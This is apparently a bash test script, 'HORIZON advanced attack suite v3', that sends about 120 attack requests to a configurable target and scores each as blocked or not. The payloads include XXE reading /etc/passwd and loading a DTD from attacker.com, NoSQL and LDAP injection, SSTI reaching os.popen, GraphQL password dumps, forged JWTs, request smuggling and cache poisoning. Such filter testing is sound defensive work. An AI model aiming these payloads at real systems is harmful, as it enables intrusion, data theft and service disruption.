#!/bin/bash
RED='\033[0;31m'; GRN='\033[0;32m'; YEL='\033[1;33m'; BOLD='\033[1m'; NC='\033[0m'
TARGET="${TARGET:-http://127.0.0.1:8080}"
PASS=0; FAIL=0; DEAD=0; TOTAL=0

check() {
    local name="$1" code="$2"
    TOTAL=$((TOTAL + 1))
    case "$code" in
        400|401|403|404|405|406|408|409|410|413|414|415|418|422|429|431|451)
            PASS=$((PASS + 1)); printf "${GRN}PASS${NC} [%3d] %-45s %s\n" "$TOTAL" "$name" "$code" ;;
        000) DEAD=$((DEAD + 1)); printf "${YEL}DEAD${NC} [%3d] %-45s\n" "$TOTAL" "$name" ;;
        *)   FAIL=$((FAIL + 1)); printf "${RED}FAIL${NC} [%3d] %-45s %s\n" "$TOTAL" "$name" "$code" ;;
    esac
}

hit() {
    local path="$1"; shift
    curl -s -o /dev/null -w "%{http_code}" -m 5 "$@" "$TARGET$path" 2>/dev/null || echo 000
}

enc() { printf %s "$1" | od -An -tx1 | tr -d ' \n' | sed 's/../%&/g'; }

echo "════════════════════════════════════════════════════════"
echo "  HORIZON — ADVANCED ATTACK SUITE v3"
echo "  Target: $TARGET"
echo "════════════════════════════════════════════════════════"

echo ""
echo "${BOLD}[1/15] XXE${NC}"
check "XXE file://passwd" "$(hit /api/reading -X POST -H 'Content-Type: application/xml' -d '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><x>&xxe;</x>')"
check "XXE http://attacker" "$(hit /api/reading -X POST -H 'Content-Type: application/xml' -d '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY % p SYSTEM "http://attacker.com/x"> %p;]><x/>')"
check "XXE external DTD" "$(hit /api/reading -X POST -H 'Content-Type: application/xml' -d '<?xml version="1.0"?><!DOCTYPE x SYSTEM "http://attacker.com/x.dtd"><x/>')"
check "XXE expect://" "$(hit /api/reading -X POST -H 'Content-Type: application/xml' -d '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "expect://id">]><x>&xxe;</x>')"
check "XXE php://filter" "$(hit /api/reading -X POST -H 'Content-Type: application/xml' -d '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "php://filter/resource=/etc/passwd">]><x>&xxe;</x>')"

echo ""
echo "${BOLD}[2/15] NoSQL Injection${NC}"
check "NoSQL auth bypass" "$(hit /api/reading -X POST -H 'Content-Type: application/json' -d '{"username":{"$gt":""},"password":{"$gt":""}}')"
check "NoSQL where sleep" "$(hit /api/reading -X POST -H 'Content-Type: application/json' -d '{"$where":"sleep(5000)"}')"
check "NoSQL ne null" "$(hit /api/reading -X POST -H 'Content-Type: application/json' -d '{"sensor_id":{"$ne":null}}')"
check "NoSQL regex" "$(hit /api/reading -X POST -H 'Content-Type: application/json' -d '{"value":{"$regex":".*"}}')"
check "NoSQL or array" "$(hit /api/reading -X POST -H 'Content-Type: application/json' -d '{"$or":[{"a":1},{"b":2}]}')"
check "NoSQL comment" "$(hit /api/reading -X POST -H 'Content-Type: application/json' -d '{"$comment":"inj"}')"
check "NoSQL expr" "$(hit /api/reading -X POST -H 'Content-Type: application/json' -d '{"$expr":{"$gt":["$v",0]}}')"
check "NoSQL function" "$(hit /api/reading -X POST -H 'Content-Type: application/json' -d '{"$function":"return true"}')"

echo ""
echo "${BOLD}[3/15] SSTI${NC}"
for p in '{{7*7}}' '${7*7}' '<%= 7*7 %>' '{{config}}' '{{self.__class__}}' '#{7*7}' '{{7*"7"}}' '{{config.items()}}'; do
    check "SSTI: $(echo $p | head -c 35)" "$(hit "/api/reading?site_id=$(enc "$p")")"
done
check "SSTI jinja subclasses" "$(hit "/api/reading?site_id=$(enc '{{"".__class__.__base__.__subclasses__()}}')")"
check "SSTI lipsum popen" "$(hit "/api/reading?site_id=$(enc '{{lipsum.__globals__.os.popen}}')")"
check "SSTI javax" "$(hit "/api/reading?site_id=$(enc '{{javax.script}}')")"

echo ""
echo "${BOLD}[4/15] LDAP Injection${NC}"
for p in '*' '*)(&' 'admin*' '*)(objectClass=*' 'x)(|(password=*' '*))%00' 'admin)(&)' 'admin)(!(&(1=0'; do
    check "LDAP: $(echo $p | head -c 35)" "$(hit "/api/reading?site_id=$(enc "$p")")"
done

echo ""
echo "${BOLD}[5/15] GraphQL Injection${NC}"
check "GQL schema introspection" "$(hit /graphql -X POST -H 'Content-Type: application/json' -d '{"query":"{__schema{types{name}}}"}')"
check "GQL __type User" "$(hit /graphql -X POST -H 'Content-Type: application/json' -d '{"query":"{__type(name:\"User\")}"}')"
check "GQL user password" "$(hit /graphql -X POST -H 'Content-Type: application/json' -d '{"query":"{user(id:1){password}}"}')"
check "GQL deleteAll" "$(hit /graphql -X POST -H 'Content-Type: application/json' -d '{"query":"mutation{deleteAllUsers}"}')"
check "GQL users dump" "$(hit /graphql -X POST -H 'Content-Type: application/json' -d '{"query":"{users{id,email,token}}"}')"
check "GQL typename" "$(hit /graphql -X POST -H 'Content-Type: application/json' -d '{"query":"{__typename}"}')"
check "GQL variables" "$(hit /graphql -X POST -H 'Content-Type: application/json' -d '{"query":"{a}","variables":{"a":"$where"}}')"
check "GQL queryType" "$(hit /graphql -X POST -H 'Content-Type: application/json' -d '{"query":"{__schema{queryType{name}}}"}')"

echo ""
echo "${BOLD}[6/15] Prototype Pollution${NC}"
check "Proto admin true" "$(hit /api/reading -X POST -H 'Content-Type: application/json' -d '{"__proto__":{"admin":true}}')"
check "Constructor prototype" "$(hit /api/reading -X POST -H 'Content-Type: application/json' -d '{"constructor":{"prototype":{"admin":true}}}')"
check "Proto polluted" "$(hit /api/reading -X POST -H 'Content-Type: application/json' -d '{"__proto__":{"polluted":"yes"}}')"
check "Constructor isAdmin" "$(hit /api/reading -X POST -H 'Content-Type: application/json' -d '{"constructor":{"prototype":{"isAdmin":true}}}')"
check "Proto with sensor" "$(hit /api/reading -X POST -H 'Content-Type: application/json' -d '{"sensor_id":"x","__proto__":{"evil":1}}')"
check "Constructor evil" "$(hit /api/reading -X POST -H 'Content-Type: application/json' -d '{"constructor":{"prototype":{"evil":1}}}')"
check "Proto toString" "$(hit /api/reading -X POST -H 'Content-Type: application/json' -d '{"__proto__":{"toString":"hacked"}}')"
check "Prototype key" "$(hit /api/reading -X POST -H 'Content-Type: application/json' -d '{"prototype":{"polluted":1}}')"

echo ""
echo "${BOLD}[7/15] HTTP Smuggling${NC}"
check "CL-TE smuggle" "$(hit / -H 'Content-Length: 13' -H 'Transfer-Encoding: chunked' --data-binary $'0\r\n\r\nSMUGGLED')"
check "TE-CL smuggle" "$(hit / -H 'Transfer-Encoding: chunked' -H 'Content-Length: 3' --data-binary $'0\r\n\r\n')"
check "TE space" "$(hit / -H 'Transfer-Encoding: chunked ')"
check "TE obfuscated" "$(hit / -H 'Transfer-Encoding: xchunked')"
check "CL negative" "$(hit / -H 'Content-Length: -1')"
check "CL huge" "$(hit / -H 'Content-Length: 999999999999')"
check "TE twice" "$(hit / -H 'Transfer-Encoding: chunked' -H 'Transfer-Encoding: identity')"
check "CL twice" "$(hit / -H 'Content-Length: 5' -H 'Content-Length: 10')"
check "CL comma" "$(hit / -H 'Content-Length: 5, 5')"
check "TE tab" "$(hit / -H $'Transfer-Encoding:\tchunked')"

echo ""
echo "${BOLD}[8/15] JWT Advanced${NC}"
check "JWT kid path" "$(hit /admin/stats -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsImtpZCI6Ii4uLy4uLy9kZXYvbnVsbCJ9.e30.x')"
check "JWT kid SQLi" "$(hit /admin/stats -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsImtpZCI6IicgT1IgMT0xLS0ifQ.e30.x")"
check "JWT jku" "$(hit /admin/stats -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsImp3ayI6e319.e30.x')"
check "JWT x5u" "$(hit /admin/stats -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsIng1dSI6Imh0dHA6Ly9ldmlsIn0.e30.x')"
check "JWT alg=none exp0" "$(hit /admin/stats -H 'Authorization: Bearer eyJhbGciOiJub25lIn0.eyJleHAiOjB9.')"
check "JWT alg array" "$(hit /admin/stats -H 'Authorization: Bearer eyJhbGciOlsiSFMyNTYiLCJub25lIl19.e30.x')"
check "JWT None uppercase" "$(hit /admin/stats -H 'Authorization: Bearer eyJhbGciOiJOb25lIn0.e30.')"
check "JWT zlib DEF" "$(hit /admin/stats -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInppcCI6IkRFRiJ9.e30.x')"
check "JWT null byte" "$(hit /admin/stats -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.e30%00x')"
check "JWT whitespace alg" "$(hit /admin/stats -H 'Authorization: Bearer eyJhbGciOiAiSFMyNTYiIH0.e30.x')"

echo ""
echo "${BOLD}[9/15] Race Condition${NC}"
code=$(bash -c "for i in \$(seq 1 20); do curl -s -o /dev/null -w '%{http_code}\n' -m 3 '$TARGET/admin/stats' & done; wait" 2>/dev/null | sort -u | head -1)
check "Race 20 parallel" "${code:-000}"
code=$(bash -c "for i in \$(seq 1 30); do curl -s -o /dev/null -w '%{http_code}\n' -m 3 '$TARGET/api/reading?site_id=x' & done; wait" 2>/dev/null | sort -u | head -1)
check "Race 30 parallel" "${code:-000}"

echo ""
echo "${BOLD}[10/15] WebSocket/Upgrade${NC}"
check "WS upgrade" "$(hit /ws -H 'Upgrade: websocket' -H 'Connection: Upgrade' -H 'Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==' -H 'Sec-WebSocket-Version: 13')"
check "h2c upgrade" "$(hit / -H 'Upgrade: h2c' -H 'Connection: Upgrade')"
check "weird proto" "$(hit / -H 'Upgrade: evil' -H 'Connection: Upgrade')"
check "keep-alive" "$(hit / -H 'Connection: Keep-Alive')"
check "HTTP/2 prior knowledge" "$(curl -s -o /dev/null -w '%{http_code}' --http2-prior-knowledge -m 5 "$TARGET/" 2>/dev/null || echo 000)"

echo ""
echo "${BOLD}[11/15] Unicode/Encoding Bypass${NC}"
for p in '%E2%80%AE' '%E2%81%A6' '%EF%BB%BFadmin' 'adm%C4%B1n' '%252e%252e%252f' '%c0%2e%c0%2e%c0%2f' '%2e%2e%5c' '%2e%2e%2e%2f' '%2e%2e%c0%af' '%u002e%u002e%u002f' 'admin%c0%ae%c0%ae'; do
    check "Uni: $p" "$(hit "/api/reading?site_id=$p")"
done

echo ""
echo "${BOLD}[12/15] Cache Poisoning${NC}"
check "X-Forwarded-Host" "$(hit / -H 'X-Forwarded-Host: evil.com')"
check "X-Forwarded-Scheme" "$(hit / -H 'X-Forwarded-Scheme: http')"
check "X-Forwarded-Port" "$(hit / -H 'X-Forwarded-Port: 1337')"
check "X-Original-Host" "$(hit / -H 'X-Original-Host: evil.com')"
check "Cache-Control poison" "$(hit / -H 'Cache-Control: max-age=999999')"
check "Vary star" "$(hit / -H 'Vary: *')"
check "Age header" "$(hit / -H 'Age: 99999999')"
check "Pragma" "$(hit / -H 'Pragma: no-cache')"

echo ""
echo "${BOLD}[13/15] Authorization Confusion${NC}"
check "Bearer empty" "$(hit /admin/stats -H 'Authorization: Bearer')"
check "Bearer null" "$(hit /admin/stats -H 'Authorization: Bearer null')"
check "Bearer undefined" "$(hit /admin/stats -H 'Authorization: Bearer undefined')"
check "Bearer NaN" "$(hit /admin/stats -H 'Authorization: Bearer NaN')"
check "Bearer 0x0" "$(hit /admin/stats -H 'Authorization: Bearer 0x0')"
check "Bearer two headers" "$(hit /admin/stats -H 'Authorization: Bearer a' -H 'Authorization: Bearer b')"
check "Basic admin:admin" "$(hit /admin/stats -H 'Authorization: Basic YWRtaW46YWRtaW4=')"
check "NTLM" "$(hit /admin/stats -H 'Authorization: NTLM TlRMTVNTUAAB')"
check "Digest" "$(hit /admin/stats -H 'Authorization: Digest username=x')"
check "MAC" "$(hit /admin/stats -H 'Authorization: MAC id=x')"

echo ""
echo "${BOLD}[14/15] Content-Type Confusion${NC}"
check "CT null" "$(hit /api/reading -X POST -H 'Content-Type: null' -d '{}')"
check "CT utf-16" "$(hit /api/reading -X POST -H 'Content-Type: application/json; charset=utf-16' -d '{}')"
check "CT nested" "$(hit /api/reading -X POST -H 'Content-Type: application/json, text/html' -d '{}')"
check "CT form+json" "$(hit /api/reading -X POST -H 'Content-Type: application/x-www-form-urlencoded' -d '{"a":1}')"
check "CT missing" "$(hit /api/reading -X POST -d '{"sensor_id":"x"}')"
check "CT multipart" "$(hit /api/reading -X POST -H 'Content-Type: multipart/form-data; boundary=x' -d 'x')"
check "CT text/json" "$(hit /api/reading -X POST -H 'Content-Type: text/json' -d '{}')"
check "CT application/jsonp" "$(hit /api/reading -X POST -H 'Content-Type: application/jsonp' -d '{}')"
check "BOM prefix" "$(hit /api/reading -X POST -H 'Content-Type: application/json' -d $'\xEF\xBB\xBF{}')"

echo ""
echo "${BOLD}[15/15] Resource Exhaustion${NC}"
check "Many cookies" "$(hit / -H "Cookie: $(for i in $(seq 1 100); do echo -n "c$i=v$i; "; done)")"
check "Many languages" "$(hit / -H "Accept-Language: $(for i in $(seq 1 50); do echo -n "en,"; done)")"
check "Long UA" "$(hit / -H "User-Agent: $(head -c 5000 /dev/zero | tr '\0' 'X')")"
check "Nested JSON 30" "$(hit /api/reading -X POST -H 'Content-Type: application/json' -d "$(printf '%.0s{' {1..30})$(printf '%.0s}' {1..30})")"
check "Array 100 items" "$(hit /api/reading -X POST -H 'Content-Type: application/json' -d "[$(for i in $(seq 1 100); do echo -n '1,'; done)1]")"
check "Zero-width chars" "$(hit '/api/reading?site_id=%E2%80%8B%E2%80%8B')"
check "Combining chars" "$(hit '/api/reading?site_id=a%CC%81%CC%81')"

echo ""
echo "════════════════════════════════════════════════════════"
echo "  ${BOLD}SUMMARY v3${NC}"
echo "════════════════════════════════════════════════════════"
echo ""
printf "  Total:   %d\n" "$TOTAL"
printf "  ${GRN}Blocked: %d${NC}\n" "$PASS"
printf "  ${RED}Failed:  %d${NC}\n" "$FAIL"
printf "  ${YEL}Dead:    %d${NC}\n" "$DEAD"
[ "$TOTAL" -gt 0 ] && printf "  Block rate: %d%%\n" $((PASS * 100 / TOTAL))
echo ""
[ "$FAIL" -eq 0 ] && echo "  ${GRN}${BOLD}ALL BLOCKED${NC}" || echo "  ${RED}${BOLD}$FAIL NOT blocked${NC}"
echo "════════════════════════════════════════════════════════"
